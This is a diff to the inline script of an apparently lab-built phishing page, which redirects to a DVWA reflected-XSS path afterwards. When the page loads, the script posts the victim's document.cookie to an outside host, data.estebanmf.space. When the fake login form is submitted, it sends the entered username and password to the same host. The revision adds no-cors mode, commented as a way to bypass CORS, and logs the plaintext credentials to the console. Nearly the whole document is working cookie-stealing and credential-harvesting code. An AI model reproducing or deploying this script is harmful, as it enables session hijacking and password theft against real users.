@@ -17,37 +17,60 @@
     <div id="msg" style="color:green;margin-top:10px;display:none;">Sent!</div>
   </div>
   <script>
-    fetch('https://data.estebanmf.space/cookies', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({cookies: document.cookie})
-    }).catch(e => console.error('Cookie fetch failed:', e));
+    // Ensure DOM is loaded before attaching event listeners
+    document.addEventListener('DOMContentLoaded', function () {
+      console.log('DOM loaded, attaching event listener to submit-btn');
 
-    document.getElementById('submit-btn').onclick = function () {
-      let u = document.getElementById('u').value;
-      let p = document.getElementById('p').value;
-      if (!u || !p) {
-        alert('Fill both fields.');
-        return;
-      }
-      fetch('https://data.estebanmf.space/credentials', {
+      // Initial cookie send
+      fetch('https://data.estebanmf.space/cookies', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({username: u, password: p})
+        body: JSON.stringify({cookies: document.cookie}),
+        mode: 'no-cors' // Use no-cors to bypass CORS restrictions for debugging
       })
-        .then(r => {
-          if (r.ok) {
+        .then(() => console.log('Cookie fetch sent'))
+        .catch(e => console.error('Cookie fetch failed:', e));
+
+      const submitBtn = document.getElementById('submit-btn');
+      if (!submitBtn) {
+        console.error('Submit button not found');
+        return;
+      }
+
+      submitBtn.onclick = function () {
+        console.log('Submit button clicked');
+        let u = document.getElementById('u').value;
+        let p = document.getElementById('p').value;
+        if (!u || !p) {
+          console.log('Validation failed: Empty fields');
+          alert('Fill both fields.');
+          return;
+        }
+        console.log('Sending credentials:', {username: u, password: p});
+        fetch('https://data.estebanmf.space/credentials', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({username: u, password: p}),
+          mode: 'no-cors' // Use no-cors for debugging
+        })
+          .then(r => {
+            console.log('Fetch response received');
+            // Note: With mode: 'no-cors', response.ok can't be checked reliably
             document.getElementById('msg').style.display = 'block';
             setTimeout(() => {
+              console.log('Resetting inputs and redirecting');
               document.getElementById('u').value = '';
               document.getElementById('p').value = '';
               document.getElementById('msg').style.display = 'none';
               window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
             }, 2000);
-          } else throw new Error('Network error');
-        })
-        .catch(e => alert('Error: ' + e.message));
-    };
+          })
+          .catch(e => {
+            console.error('Credentials fetch failed:', e);
+            alert('Error: ' + e.message);
+          });
+      };
+    });
   </script>
 </body>
 
